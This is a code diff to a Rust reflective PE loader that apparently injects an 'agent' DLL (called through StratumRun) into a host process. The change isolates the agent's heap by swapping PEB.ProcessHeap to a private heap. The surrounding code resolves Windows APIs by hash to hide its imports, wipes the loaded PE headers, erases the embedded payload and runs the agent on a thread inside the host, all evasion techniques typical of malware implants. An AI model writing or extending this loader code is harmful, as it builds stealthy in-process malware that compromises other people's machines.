@@ -187,6 +187,7 @@ type FnDllMain          = unsafe extern "win64" fn(Handle, Dword, LpVoid) -> Boo
 type FnTlsCallback      = unsafe extern "win64" fn(Handle, Dword, LpVoid);
 type FnTlsAlloc         = unsafe extern "win64" fn() -> Dword;
 type FnHeapAlloc        = unsafe extern "win64" fn(*mut c_void, Dword, ULongPtr) -> *mut c_void;
+type FnHeapCreate       = unsafe extern "win64" fn(Dword, ULongPtr, ULongPtr) -> *mut c_void;
 type FnGetProcessHeap   = unsafe extern "win64" fn() -> *mut c_void;
 
 // ── OutputDebugStringA for loader diagnostics ─────────────────────────────────
@@ -235,6 +236,7 @@ const H_NT_WAIT_FOR_SINGLE_OBJ:     u32 = api_hash(b"NtWaitForSingleObject");
 // thread spawning bypasses the MSVC CRT (avoids __acrt_flsindex crash).
 const H_BEGIN_THREAD_EX:            u32 = api_hash(b"_beginthreadex");
 const H_HEAP_ALLOC:                 u32 = api_hash(b"HeapAlloc");
+const H_HEAP_CREATE:                u32 = api_hash(b"HeapCreate");
 const H_GET_PROCESS_HEAP:           u32 = api_hash(b"GetProcessHeap");
 const H_RTL_INIT_UNICODE_STRING:    u32 = api_hash(b"RtlInitUnicodeString");
 
@@ -476,6 +478,7 @@ unsafe fn load_pe(
     tls_alloc:        FnTlsAlloc,
     sleep_fn:         FnSleep,
     create_thread:    *const u8,   // CreateThread ptr — replaces _beginthreadex in IAT
+    heap_create:      FnHeapCreate,
 ) -> Dword {
     sc_log(k32, b"[lpe] enter\0".as_ptr());
 
@@ -793,10 +796,28 @@ unsafe fn load_pe(
     let wipe_size = opt.size_of_headers as usize;
     memset_raw(image_base as *mut u8, 0, wipe_size.min(0x1000));
 
+    // ── 11b. Isolate agent heap from host process ──────────────────────────
+    // Create a private heap and swap PEB.ProcessHeap so that StratumCrtInit,
+    // the Rust allocator, ucrtbase, and every DLL the agent imports all
+    // allocate on a dedicated heap — zero interference with the host process.
+    // PEB.ProcessHeap is at offset 0x30 in the PEB (x64 Win10/11).
+    let peb_addr: usize;
+    asm!("mov {}, gs:[0x60]", out(reg) peb_addr, options(nostack, pure, nomem));
+    let process_heap_ptr = (peb_addr + 0x30) as *mut usize;
+    let _old_process_heap = *process_heap_ptr;
+    let private_heap = heap_create(0, 0, 0);
+    if !private_heap.is_null() {
+        *process_heap_ptr = private_heap as usize;
+        sc_log(k32, b"[lpe] PEB.ProcessHeap swapped to private\0".as_ptr());
+    } else {
+        sc_log(k32, b"[lpe] HeapCreate failed, using host heap\0".as_ptr());
+    }
+
     // ── 12. Run DLL CRT initialisers, then call StratumRun ───────────────────
     // StratumCrtInit walks __xi_a..__xi_z and __xc_a..__xc_z so that Rust's
     // panic handler, thread-local infrastructure, and all static initialisers
     // are set up before any Rust code in the DLL runs.
+    // All allocations now go to the private heap via PEB.ProcessHeap.
     if !p_ci.is_null() {
         sc_log(k32, b"[lpe] calling StratumCrtInit\0".as_ptr());
         type FnCrtInit = unsafe extern "win64" fn();
@@ -899,6 +920,7 @@ unsafe extern "win64" fn agent_thread(_: LpVoid) -> Dword {
     let p_ta = get_proc_by_hash(k32, H_TLS_ALLOC);             if p_ta.is_null() { sc_log(k32, b"[at] ERR6 no TA\0".as_ptr()); return 6; }
     let p_sl = get_proc_by_hash(k32, H_SLEEP);                 if p_sl.is_null() { sc_log(k32, b"[at] ERR7 no SL\0".as_ptr()); return 7; }
     let p_ct = get_proc_by_hash(k32, H_CREATE_THREAD); // may be null — soft failure
+    let p_hc = get_proc_by_hash(k32, H_HEAP_CREATE);  if p_hc.is_null() { sc_log(k32, b"[at] ERR8 no HC\0".as_ptr()); return 8; }
     sc_log(k32, b"[at] APIs resolved\0".as_ptr());
     let virtual_alloc:    FnVirtualAlloc         = mem::transmute(p_va);
     let virtual_protect:  FnVirtualProtect       = mem::transmute(p_vp);
@@ -906,6 +928,7 @@ unsafe extern "win64" fn agent_thread(_: LpVoid) -> Dword {
     let get_proc_addr:    FnGetProcAddress       = mem::transmute(p_gp);
     let tls_alloc:        FnTlsAlloc             = mem::transmute(p_ta);
     let sleep_fn:         FnSleep                = mem::transmute(p_sl);
+    let heap_create:      FnHeapCreate           = mem::transmute(p_hc);
 
     sc_log(k32, b"[at] calling load_pe\0".as_ptr());
     let result = load_pe(
@@ -919,6 +942,7 @@ unsafe extern "win64" fn agent_thread(_: LpVoid) -> Dword {
         tls_alloc,
         sleep_fn,
         p_ct,
+        heap_create,
     );
 
     wipe_embedded_pe(virtual_protect);
